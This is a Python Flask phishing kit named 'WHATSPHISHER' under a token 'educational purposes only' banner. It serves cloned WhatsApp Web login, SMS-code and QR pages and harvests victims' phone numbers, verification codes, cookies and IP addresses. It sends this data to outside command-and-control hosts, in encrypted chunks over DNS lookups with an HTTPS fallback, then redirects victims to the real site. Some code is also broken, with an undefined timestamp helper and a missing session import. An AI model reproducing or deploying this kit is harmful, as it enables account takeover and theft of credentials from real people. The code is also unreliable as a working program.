#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WHATSPHISHER v14.0 - Elite Account Targeting System
# EDUCATIONAL PURPOSES ONLY - UNAUTHORIZED ACCESS IS ILLEGAL

import os
import re
import json
import base64
import hashlib
import threading
import requests
from flask import Flask, request, render_template_string, redirect, make_response
from cryptography.fernet import ((Fernet))

# ===== CONFIGURATION =====
C2_SERVER = "https://c2.secure-msg.io/collect"
EXFIL_KEY = Fernet.generate_key()
PHONE_VERIFICATION_ENABLED = True
SESSION_HIJACK_ENABLED = True
QR_CODE_HARVESTING = True
# =========================

app = Flask(__name__)
app.secret_key = os.urandom(32)


# === EVASION TECHNIQUES ===
class StealthModule:
    @staticmethod
    def get_user_fingerprint():
        """Create unique user fingerprint"""
        components = [
            request.headers.get('User-Agent', ''),
            request.headers.get('Accept-Language', ''),
            request.remote_addr,
            request.headers.get('Sec-CH-UA-Platform', '')
        ]
        return hashlib.sha256('|'.join(components).encode()).hexdigest()

    @staticmethod
    def bypass_security():
        """Mimic legitimate WhatsApp traffic patterns"""
        return {
            'user_agent': 'WhatsApp/2.22.25.81',
            'content_type': 'application/x-www-form-urlencoded',
            'origin': 'https://web.whatsapp.com'
        }


# === DATA HARVESTING ===
class WhatsAppHarvester:
    @staticmethod
    def capture_credentials(phone, code):
        """Capture and encrypt credentials"""
        payload = {
            'type': 'whatsapp_credentials',
            'timestamp': StealthModule.get_timestamp(),
            'fingerprint': StealthModule.get_user_fingerprint(),
            'data': {
                'phone': phone,
                'code': code,
                'ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent'),
                'cookies': request.cookies
            }
        }
        threading.Thread(target=WhatsAppHarvester.exfiltrate, args=(payload,)).start()

    @staticmethod
    def capture_qr_session(qr_data):
        """Capture QR session data"""
        payload = {
            'type': 'whatsapp_qr_session',
            'timestamp': StealthModule.get_timestamp(),
            'fingerprint': StealthModule.get_user_fingerprint(),
            'data': {
                'qr_data': qr_data,
                'ip': request.remote_addr
            }
        }
        threading.Thread(target=WhatsAppHarvester.exfiltrate, args=(payload,)).start()

    @staticmethod
    def exfiltrate(data):
        """Stealth data transmission"""
        cipher = Fernet(EXFIL_KEY)
        encrypted = cipher.encrypt(json.dumps(data).encode())
        b32_encoded = base64.b32encode(encrypted).decode()

        try:
            # DNS exfiltration method
            chunks = [b32_encoded[i:i + 60] for i in range(0, len(b32_encoded), 60)]
            for chunk in chunks:
                requests.get(f"http://{chunk}.whatsapp-track.io", timeout=1)
        except:
            try:
                # HTTPS fallback
                requests.post(C2_SERVER, data={'d': b32_encoded}, timeout=2, verify=False)
            except:
                pass


# === WHATSAPP CLONE PAGES ===
class PhishingPages:
    @staticmethod
    def login_page():
        """Realistic WhatsApp Web login page"""
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        :root {
            --whatsapp-green: #128C7E;
            --whatsapp-light-green: #25D366;
            --whatsapp-dark: #075E54;
            --whatsapp-blue: #34B7F1;
            --whatsapp-gray: #ECE5DD;
        }

        body {
            background: var(--whatsapp-gray);
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            border-radius: 3px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            color: var(--whatsapp-green);
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        h1 {
            color: var(--whatsapp-dark);
            font-size: 1.8rem;
            margin-bottom: 10px;
        }

        .description {
            color: #667781;
            margin-bottom: 30px;
            font-size: 1rem;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: var(--whatsapp-dark);
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1rem;
            margin-bottom: 15px;
        }

        input:focus {
            border-color: var(--whatsapp-green);
            outline: none;
        }

        .country-code {
            display: flex;
            align-items: center;
            background: #f9f9f9;
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 0 12px;
            margin-bottom: 15px;
        }

        .country-code span {
            color: #555;
            margin-right: 8px;
        }

        .country-code input {
            border: none;
            background: transparent;
            padding: 14px 0;
            margin: 0;
        }

        .button {
            background: var(--whatsapp-green);
            color: white;
            border: none;
            border-radius: 24px;
            padding: 14px 24px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }

        .button:hover {
            background: var(--whatsapp-dark);
        }

        .qr-option {
            margin-top: 25px;
            padding-top: 25px;
            border-top: 1px solid #eee;
        }

        .qr-link {
            color: var(--whatsapp-blue);
            text-decoration: none;
            font-weight: 500;
        }

        .qr-link:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 30px;
            font-size: 0.85rem;
            color: #8696a0;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // QR code generation simulation
            document.getElementById('qr-link').addEventListener('click', (e) => {
                e.preventDefault();
                window.location.href = '/qr-auth';
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">WhatsApp</div>
        <h1>Use WhatsApp on your computer</h1>
        <p class="description">
            To use WhatsApp on your computer, you need to verify your phone number.
        </p>

        <form action="/verify-phone" method="POST">
            <div class="form-group">
                <label for="phone">Enter your phone number</label>
                <div class="country-code">
                    <span>+</span>
                    <input type="text" name="country" placeholder="1" value="1" maxlength="3" style="width: 50px;">
                    <input type="tel" name="phone" placeholder="Phone number" required>
                </div>
            </div>

            <button type="submit" class="button">Next</button>
        </form>

        <div class="qr-option">
            <p>Or authenticate using <a href="#" id="qr-link">QR code</a></p>
        </div>

        <div class="footer">
            By proceeding, you consent to WhatsApp sending SMS messages for verification.
        </div>
    </div>
</body>
</html>
"""

    @staticmethod
    def verification_page():
        """WhatsApp verification code entry page"""
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification</title>
    <style>
        /* Same styling as login page with minor adjustments */
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }

        .code-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 1.5rem;
            border: 2px solid #ddd;
            border-radius: 8px;
        }

        .code-input:focus {
            border-color: var(--whatsapp-green);
            outline: none;
        }

        .resend-link {
            color: var(--whatsapp-blue);
            cursor: pointer;
            margin-top: 15px;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const inputs = document.querySelectorAll('.code-input');

            // Auto-focus and move between inputs
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length > 0) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        } else {
                            document.getElementById('verify-form').submit();
                        }
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">WhatsApp</div>
        <h1>Verify your phone number</h1>
        <p class="description">
            Enter the 6-digit code we sent via SMS to your phone
        </p>

        <form id="verify-form" action="/verify-code" method="POST">
            <div class="code-inputs">
                <input type="text" name="digit1" class="code-input" maxlength="1" required autofocus>
                <input type="text" name="digit2" class="code-input" maxlength="1" required>
                <input type="text" name="digit3" class="code-input" maxlength="1" required>
                <input type="text" name="digit4" class="code-input" maxlength="1" required>
                <input type="text" name="digit5" class="code-input" maxlength="1" required>
                <input type="text" name="digit6" class="code-input" maxlength="1" required>
            </div>

            <input type="hidden" name="phone" value="{{ phone }}">

            <button type="submit" class="button">Verify</button>
        </form>

        <p class="resend-link" onclick="alert('Code resent!')">Resend code</p>

        <div class="footer">
            This helps us verify your account and provide a secure experience.
        </div>
    </div>
</body>
</html>
"""

    @staticmethod
    def qr_auth_page():
        """WhatsApp QR authentication page"""
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp QR Login</title>
    <style>
        .qr-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px auto;
            display: inline-block;
        }

        .instructions {
            max-width: 300px;
            margin: 20px auto;
            text-align: left;
        }

        .instruction-step {
            margin-bottom: 15px;
            display: flex;
            align-items: flex-start;
        }

        .step-number {
            background: var(--whatsapp-green);
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-right: 10px;
            flex-shrink: 0;
        }
    </style>
    <script>
        // Simulate QR code generation
        document.addEventListener('DOMContentLoaded', () => {
            // Generate fake QR code data
            const qrData = btoa(`WA:${Date.now()},${Math.random().toString(36).substring(2)}`);
            document.getElementById('qr-data').value = qrData;

            // Fake QR code refresh
            setInterval(() => {
                document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${qrData}&t=${Date.now()}`;
            }, 15000);
        });
    </script>
</head>
<body>
    <div class="container" style="max-width: 500px;">
        <div class="logo">WhatsApp</div>
        <h1>Log in with QR Code</h1>
        <p class="description">
            Scan this code with the WhatsApp app on your phone to log in instantly
        </p>

        <div class="qr-container">
            <img id="qr-image" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=WA:qrlogin" 
                 alt="WhatsApp QR Code">
        </div>

        <div class="instructions">
            <div class="instruction-step">
                <div class="step-number">1</div>
                <div>Open WhatsApp on your phone</div>
            </div>
            <div class="instruction-step">
                <div class="step-number">2</div>
                <div>Tap <strong>Settings</strong> then <strong>Linked Devices</strong></div>
            </div>
            <div class="instruction-step">
                <div class="step-number">3</div>
                <div>Point your phone at this screen to capture the code</div>
            </div>
        </div>

        <form id="qr-form" action="/capture-qr" method="POST">
            <input type="hidden" id="qr-data" name="qr_data">
        </form>

        <div class="footer">
            <a href="/" style="color: var(--whatsapp-blue); text-decoration: none;">Log in with phone number instead</a>
        </div>
    </div>
</body>
</html>
"""


# === FLASK ROUTES ===
@app.route('/')
def index():
    """Main phishing page"""
    resp = make_response(render_template_string(PhishingPages.login_page()))
    resp.set_cookie('session_id', base64.b64encode(os.urandom(24)).decode(),
                    httponly=True, secure=True, samesite='Strict')
    return resp


@app.route('/verify-phone', methods=['POST'])
def verify_phone():
    """Capture phone number"""
    country = request.form.get('country', '')
    phone = request.form.get('phone', '')
    full_phone = f"+{country}{phone}"

    # Store phone in session
    session['phone'] = full_phone

    return render_template_string(PhishingPages.verification_page(), phone=full_phone)


@app.route('/verify-code', methods=['POST'])
def verify_code():
    """Capture verification code"""
    code = ''.join([
        request.form.get('digit1', ''),
        request.form.get('digit2', ''),
        request.form.get('digit3', ''),
        request.form.get('digit4', ''),
        request.form.get('digit5', ''),
        request.form.get('digit6', '')
    ])

    phone = session.get('phone', '')

    if phone and len(code) == 6:
        WhatsAppHarvester.capture_credentials(phone, code)

    # Redirect to real WhatsApp
    return redirect('https://web.whatsapp.com', code=302)


@app.route('/qr-auth')
def qr_auth():
    """QR authentication page"""
    return render_template_string(PhishingPages.qr_auth_page())


@app.route('/capture-qr', methods=['POST'])
def capture_qr():
    """Capture QR session data"""
    if QR_CODE_HARVESTING:
        qr_data = request.form.get('qr_data', '')
        WhatsAppHarvester.capture_qr_session(qr_data)

    # Simulate successful authentication
    return redirect('https://web.whatsapp.com', code=302)


# === MAIN EXECUTION ===
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 443))
    app.run(host='0.0.0.0', port=port, ssl_context='adhoc')